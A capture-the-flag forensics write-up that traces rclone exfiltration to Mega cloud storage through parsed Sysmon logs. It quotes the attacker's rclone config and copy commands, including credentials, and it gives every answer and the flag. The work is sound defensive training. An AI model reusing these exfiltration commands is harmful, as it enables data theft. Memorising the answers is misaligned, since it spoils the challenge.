# Packet Cyclone

Category: Forensics
Difficulty: easy
Points: 425

************Category************: Crypto

****************Points:**************** 425

************************Difficulty:************************ easy

## Description

Pandora's friend and partner, Wade, is the one that leads the investigation into the relic's location. Recently, he noticed some weird traffic coming from his host. That led him to believe that his host was compromised. After a quick investigation, his fear was confirmed. Pandora tries now to see if the attacker caused the suspicious traffic during the exfiltration phase. Pandora believes that the malicious actor used rclone to exfiltrate Wade's research to the cloud. Using the tool called "chainsaw" and the sigma rules provided, can you detect the usage of rclone from the event logs produced by Sysmon? To get the flag, you need to start and connect to the docker service and answer all the questions correctly.

## Walkthrough

### File Analysis

The zip file contains the contents of Windows\System32\winevt\Logs directory, and a folder of sigma_rules. My favourite way to do this, is to use this [tool](https://github.com/Velocidex/evtx). I run it on all files in the Logs directory, which makes it easier to look for stuff.

```python
mkdir output
find 'Logs' -name "*.evtx" -size +69k -print0 | while read -d $'\0' file
do dumpevtx parse "${file}" --output="${file}.txt" 2>/dev/null
   mv "${file}.txt" output/
done
```

The description specifically mentions event logs related to rclone, and we need to connect to the docker service in order to get the flag. So, in another shell bash:

```python
nc 178.62.64.13 31177
```

### 1. What is the email of the attacker used for the exfiltration process? (for example: name@email.com)

To find that, we can use grep and search for email values in the ********Sysmon******** event log:

```python
cat 'Microsoft-Windows-Sysmon%4Operational.evtx.txt' | grep -F '@'
#returns "CommandLine": "\"C:\\Users\\wade\\AppData\\Local\\Temp\\rclone-v1.61.1-windows-amd64\\rclone.exe\" config create remote mega user majmeret@protonmail.com pass FBMeavdiaFZbWzpMqIVhJCGXZ5XXZI1qsU3EjhoKQw0rEoQqHyI",
```

****************Answer:**************** majmeret@protonmail.com

### 2. What is the password of the attacker used for the exfiltration process?

In the same output as above, we see that the pass is **FBMeavdiaFZbWzpMqIVhJCGXZ5XXZI1qsU3EjhoKQw0rEoQqHyI**

****************Answer:**************** FBMeavdiaFZbWzpMqIVhJCGXZ5XXZI1qsU3EjhoKQw0rEoQqHyI

### 3. What is the Cloud storage provider used by the attacker?

Still in the same output as question 1, the commandline shows that rclone is creating remote **mega** user. 

****************Answer:**************** Mega

### 4. What is the ID of the process used by the attackers to configure their tool?

To find the PID, we just need to look further up that specific command:

```python
cat 'Microsoft-Windows-Sysmon%4Operational.evtx.txt' | grep -F '@' -B 50 -A 50

```

```python
"EventData": {
   "RuleName": "-",
   "UtcTime": "2023-02-24 15:35:07.336",
   "ProcessGuid": "10DA3E43-D92B-63F8-B100-000000000900",
   "ProcessId": 3820,
   "Image": "C:\\Users\\wade\\AppData\\Local\\Temp\\rclone-v1.61.1-windows-amd64\\rclone.exe",
   "FileVersion": "1.61.1",
   "Description": "Rsync for cloud storage",
   "Product": "Rclone",
   "Company": "https://rclone.org",
   "OriginalFileName": "rclone.exe",
"CommandLine": "\"C:\\Users\\wade\\AppData\\Local\\Temp\\rclone-v1.61.1-windows-amd64\\rclone.exe\" config create remote mega user majmeret@protonmail.com pass FBMeavdiaFZbWzpMqIVhJCGXZ5XXZI1qsU3EjhoKQw0rEoQqHyI",
   "CurrentDirectory": "C:\\Users\\wade\\AppData\\Local\\Temp\\rclone-v1.61.1-windows-amd64\\",
   "User": "DESKTOP-UTDHED2\\wade",
   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
   "LogonId": 224587,
   "TerminalSessionId": 1,
   "IntegrityLevel": "Medium",
   "Hashes": "SHA256=E94901809FF7CC5168C1E857D4AC9CBB339CA1F6E21DCCE95DFB8E28DF799961",
   "ParentProcessGuid": "10DA3E43-D8D2-63F8-9B00-000000000900",
   "ParentProcessId": 5888,
   "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
   "ParentCommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ",
   "ParentUser": "DESKTOP-UTDHED2\\wade"
  },
```

The PID is **3820**. 

****************Answer:**************** 3820

### 5. What is the name of the folder the attacker exfiltrated; provide the full path.

Easy, just need to grep for ********************rclone.exe********************, which will show all command line parameters invoked:

```python
grep -F 'rclone.exe' * 
#"CommandLine": "\"C:\\Users\\wade\\AppData\\Local\\Temp\\rclone-v1.61.1-windows-amd64\\rclone.exe\" copy C:\\Users\\Wade\\Desktop\\Relic_location\\ remote:exfiltration -v"
```

The exfiltrated directory, is the one being copied, which is C:\Users\Wade\Desktop\Relic_location 

****************Answer:****************  C:\Users\Wade\Desktop\Relic_location 

### 6. What is the name of the folder the attacker exfiltrated the files to?

In the output above, we see that the destination is remote:exfiltration, so the name of the folder is exfiltration.

****************Answer:****************  exfiltration

************Flag:************ HTB{3v3n_3xtr4t3rr3str14l_B31nGs_us3_Rcl0n3_n0w4d4ys}